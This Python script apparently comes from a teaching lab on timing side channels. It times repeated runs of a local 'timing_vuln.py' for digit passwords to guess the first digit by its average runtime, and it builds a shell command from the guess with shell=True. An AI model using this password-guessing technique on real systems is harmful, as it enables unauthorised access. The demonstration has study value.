import time
import subprocess


ALPHABET = list("0123456789")

def time_for_password(password):
    # Build command so it does not affect out measurement
    command = "python3 timing_vuln.py {password}".format(password=password)
    
    # Start measurement 
    start = time.time()
    # Run programm
    p = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    # Finish Measurement
    return time.time() - start


def avg_time_for_password(password, tries=30):
    
    # Get multiple runtimes
    durations = [time_for_password(password) for n in range(tries)]
    
    # Calculate Average
    return sum(durations)/len(durations)


def main():

    guess = list("00000")
    # Get timing for all chars
    for c in ALPHABET:
        guess[0] = c
        print("Current Guess:", "".join(guess))
        print("Avg. Run-Time:", avg_time_for_password("".join(guess)))

    

if __name__ == "__main__":
    main()
